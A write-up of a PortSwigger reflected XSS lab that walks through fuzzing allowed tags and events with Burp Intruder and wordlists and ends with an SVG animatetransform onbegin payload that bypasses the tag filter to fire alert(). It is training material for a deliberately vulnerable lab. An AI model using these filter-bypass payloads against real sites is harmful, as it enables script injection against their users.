# Lab: Reflected XSS with some SVG markup allowed

 This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events.

To solve the lab, perform a cross-site scripting attack that calls the alert() function. 

# Step 1 identify input being reflected on the page

I find that the search bar string is reflected on the page after a search is performed:

![image](https://user-images.githubusercontent.com/83407557/211160099-22bbadac-ae51-4d3e-bae4-224733489f82.png)

![image](https://user-images.githubusercontent.com/83407557/211160128-5f9bcaa5-3576-444c-bead-c5299063f332.png)

# Step 2 find allowed tags

## Finding some tags are blocked

I test to see if tags/events are being blocked with a few simple xss payloads:

```html
<script>alert(document.domain)</script>

<img src=1 onerror=alert(document.domain)>
```
![image](https://user-images.githubusercontent.com/83407557/211160481-1ddce7dc-7994-48be-8717-905eab5b40b5.png)


![image](https://user-images.githubusercontent.com/83407557/211160418-a17c7cff-9fed-4be2-bca5-693df5ba0091.png)

however I get a 400 error that state "Tag is not allowed" for both payloads:

![image](https://user-images.githubusercontent.com/83407557/211160445-73188be5-7310-4875-a9d3-207f06082572.png)

## FUZZing all tags

To fuzz the tags I send the following and send it to an intruder attack:

![image](https://user-images.githubusercontent.com/83407557/211160537-22425ba6-8278-474a-b5d1-0ed2e39c639c.png)

![image](https://user-images.githubusercontent.com/83407557/211160577-dc721f07-fd30-4f8a-952e-fcd082633a65.png)

I set the payload position on the word FUZZ:

![image](https://user-images.githubusercontent.com/83407557/211160611-4d5f976e-d48c-46cc-a7b5-dae79baf595d.png)

Then for payload I select tags from portswigger's [xss cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet):

![image](https://user-images.githubusercontent.com/83407557/211160656-7284650f-6d08-41ef-92bd-f4876ef102b4.png)

I create a wordlist to use for future reference *can also be found in this github repository [here](tags)* where I have added a few more tags that I use for testing:

```bash
└─$ head tags.lst  
a
a2
abbr
acronym
address
applet
area
article
aside
audio
```

Then add the tags as the payloads of my intruder attack:

![image](https://user-images.githubusercontent.com/83407557/211160802-85ab7135-cbc5-4782-95d4-4a0e7cc3716b.png)

While most of the tags have 400 responses, a few have 200 telling me they are valid tags that will bypass the filer:

![image](https://user-images.githubusercontent.com/83407557/211160878-cd9a64fe-bbcf-4955-92fe-63b7b858c73c.png)

These tags are:
```html
<svg>
<image>
<svg><animatetransform>
<title>
```

# Step 2 Find allowed events

Using the same method as with tags I create a custom [wordlist](events) for all possible events

```bash
└─$ head events.lst 
onafterscriptexecute
onanimationcancel
onanimationend
onanimationiteration
onanimationstart
onbeforecopy
onbeforecut
onbeforeinput
onbeforescriptexecute
onblur
```
Then try a few payloads using the found valid tags:

```html
<image src=/FUZZ=1>
```

I send this request to intruder and set the payload position on the word FUZZ:

![image](https://user-images.githubusercontent.com/83407557/211161394-adf7fd9a-9fd5-4eee-8703-799e64828eff.png)

Then set to payload to the events wordlist:

![image](https://user-images.githubusercontent.com/83407557/211162088-518335e9-9b9d-4a2c-b99a-5a485d168ec1.png)

Only a single event (onbegin) has worked:

![image](https://user-images.githubusercontent.com/83407557/211162155-b09c9695-40c7-4a49-a498-5ea16732794f.png)

# Step 3 create POC

Looking back at the cheat sheet, I find only a single payload that support onbegin 

![image](https://user-images.githubusercontent.com/83407557/211162296-5e61e335-4dc1-47f3-9a86-b0074e6e233a.png)

```html
<svg><animatetransform onbegin=alert(document.domain) attributeName=transform>
```
![image](https://user-images.githubusercontent.com/83407557/211162880-a34cb323-2d58-484e-92fa-cc1eb84d6c26.png)

An alert fires:

![image](https://user-images.githubusercontent.com/83407557/211162907-385b28c2-b7cb-43db-a3c4-5323da93753b.png)

and the lab is solved:

![image](https://user-images.githubusercontent.com/83407557/211162912-688bc080-3d09-47cd-8d92-2b2ddbca1b1e.png)
